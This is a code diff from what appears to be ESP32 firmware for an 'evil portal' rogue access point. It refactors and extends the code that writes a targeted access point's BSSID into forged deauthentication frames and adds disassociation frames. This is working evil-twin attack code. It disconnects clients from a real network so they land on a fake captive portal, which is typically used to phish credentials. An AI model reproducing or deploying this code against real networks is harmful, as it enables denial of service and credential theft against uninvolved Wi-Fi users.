@@ -24,9 +24,8 @@ class CaptiveRequestHandler : public AsyncWebHandler {
         }
 };
 
-WiFiModules wifi_obj;
-
-uint8_t deauth_frame[sizeof(wifi_obj.deauth_frame_packet)];
+uint8_t deauth_frame[sizeof(wifi.deauth_frame_packet)];
+uint8_t disassoc_frame[sizeof(wifi.disassoc_frame_packet)];
 
 
 EvilPortalAddtional::EvilPortalAddtional() 
@@ -164,22 +163,15 @@ bool EvilPortalAddtional::apSetup(String essid, bool _deauth) {
         for (int i = 0; i < access_points->size(); i++) {
             if (access_points->get(i).selected) {
                 if (_deauth) {
-                    memcpy(deauth_frame, wifi_obj.deauth_frame_packet, sizeof(wifi_obj.deauth_frame_packet));
+                    memcpy(deauth_frame, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet));
+                    memcpy(disassoc_frame, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet));
                     esp_wifi_set_channel(access_points->get(i).channel, WIFI_SECOND_CHAN_NONE);
                     vTaskDelay(50 / portTICK_PERIOD_MS);
-                    deauth_frame[10] = access_points->get(i).bssid[0];
-                    deauth_frame[11] = access_points->get(i).bssid[1];
-                    deauth_frame[12] = access_points->get(i).bssid[2];
-                    deauth_frame[13] = access_points->get(i).bssid[3];
-                    deauth_frame[14] = access_points->get(i).bssid[4];
-                    deauth_frame[15] = access_points->get(i).bssid[5];
-                
-                    deauth_frame[16] = access_points->get(i).bssid[0];
-                    deauth_frame[17] = access_points->get(i).bssid[1];
-                    deauth_frame[18] = access_points->get(i).bssid[2];
-                    deauth_frame[19] = access_points->get(i).bssid[3];
-                    deauth_frame[20] = access_points->get(i).bssid[4];
-                    deauth_frame[21] = access_points->get(i).bssid[5];
+                    memcpy(&deauth_frame[10], access_points->get(i).bssid, 6);
+                    memcpy(&deauth_frame[16], access_points->get(i).bssid, 6);
+
+                    memcpy(&disassoc_frame[10], access_points->get(i).bssid, 6);
+                    memcpy(&disassoc_frame[16], access_points->get(i).bssid, 6);
                 }
                 ap_name = access_points->get(i).essid;
                 break;
